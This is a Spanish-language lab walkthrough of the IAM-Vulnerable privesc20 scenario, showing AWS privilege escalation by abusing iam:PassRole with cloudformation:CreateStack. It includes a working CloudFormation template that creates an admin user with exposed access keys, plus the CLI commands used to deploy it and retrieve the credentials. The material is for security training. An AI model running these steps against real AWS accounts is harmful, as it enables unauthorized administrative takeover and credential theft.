---
description: 'Lab: IAM-VULNERABLE'
---

# PassExistingRoleToCloudFormation

Un atacante con los permisos de <mark style="color:green;">**iam:PassRole**</mark> y <mark style="color:green;">**cloudformation:CreateStack**</mark> podría aumentar sus privilegios mediante la creación de una plantilla de CloudFormation que realizará acciones y creará recursos utilizando los permisos del rol que se pasó al crear una pila de CloudFormation

{% embed url="https://github.com/BishopFox/iam-vulnerable#supported-privilege-escalation-paths" %}
Lab: IAM - Vulnerable | Escenario: privesc20
{% endembed %}

### Configuración inicial

Usuario del laboratorio: privesc20-PassExistingRoleToCloudFormation-user Con las siguientes políticas

<figure><img src="../../../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

Y configurar las llaves de acceso con AWS CLI\


<figure><img src="../../../../.gitbook/assets/image (11) (2).png" alt=""><figcaption></figcaption></figure>

### Explotación

En este escenario, tenemos que aprovechar del privilegio de <mark style="color:green;">**cloudformation:CreateStack**</mark> para crear un stack que tendrá lo necesario para escalar privilegios. Posteriormente, utilizaremos el permiso <mark style="color:green;">**cloudformation:DescribeStacks**</mark> para visualizar información relacionada al stack malicioso.&#x20;

No hay una serie de pasos específicos para escalar privilegios mediante el uso de CloudFormation. Ya que el atacante puede indicarle a CloudFormation que active cualquier recurso de AWS. En pocas palabras, se puede utilizar Cloudformation para escalar privilegios de diversas maneras como, por ejemplo, creando un nuevo usuario con permisos de administrador como se usa en el ejemplo a continuación.

Para este ejercicio se requiere de una plantilla para crear un usuario con privilegios de administrador:

{% code title="IAMCreateUserTemplate.json" overflow="wrap" %}
```json
{
  "Resources": {
    "HackedUser": {
      "Type": "AWS::IAM::User"
    },
    "AdminPolicy": {
      "Type": "AWS::IAM::ManagedPolicy",
      "Properties": {
        "Description" : "This policy allows all actions on all resources.",
        "PolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [
            {
              "Effect": "Allow",
              "Action": [
                "*"
              ],
              "Resource": "*"
            }
          ]
        },
        "Users": [{
          "Ref": "HackedUser"
        }]
      }
    },
    "MyUserKeys": {
      "Type": "AWS::IAM::AccessKey",
      "Properties": {
        "UserName": {
          "Ref": "HackedUser"
        }
      }
    }
  },
  "Outputs": {
    "AccessKey": {
      "Value": {
        "Ref": "MyUserKeys"
      },
      "Description": "Access Key ID of Admin User"
    },
    "SecretKey": {
      "Value": {
        "Fn::GetAtt": [
          "MyUserKeys",
          "SecretAccessKey"
        ]
      },
      "Description": "Secret Key of Admin User"
    }
  }
}

```
{% endcode %}

Despues usando el comomando cloudformation create-stack se crea un stack con el parámetro --role para hace ruso de PassRole al servicio.

{% code overflow="wrap" %}
```
aws cloudformation create-stack --stack-name privesc --template-body file:///home/user/IAMCreateUserTemplate.json --role arn:aws:iam::ID_account:role/privesc-high-priv-service-role --capabilities CAPABILITY_IAM --profile privesc20
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

En la evidencia previa, podemos apreciar el valor del StackId que fue retornado después de ejecutar el comando para crear el stack malicioso. Ahora que hemos creado nuestro stack malicioso, vamos aprovechar nuestro otro privilegio de cloudformation:DescribeStacks para visualizar el outputkey y posteriormente autenticarnos con estas credenciales.

{% code overflow="wrap" %}
```
aws cloudformation describe-stacks --stack-name arn:aws:cloudformation:us-east-1:ID_Account:stack/privesc --profile privesc20
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (60) (1).png" alt=""><figcaption></figcaption></figure>

En la imagen se muestra la correcta creación del stack junto con las credenciales de acceso del usuario admin creado. se procede a utilizar esas llaves de acceso

<figure><img src="../../../../.gitbook/assets/image (61) (1).png" alt=""><figcaption></figcaption></figure>

Usando estas credenciales se listan las capacidades del usuario creado

<figure><img src="../../../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

Como se observa, el usuario HackedUser, tiene políticas de full administrador, habiendo comprometido y escalado privilegios de manera correcta.



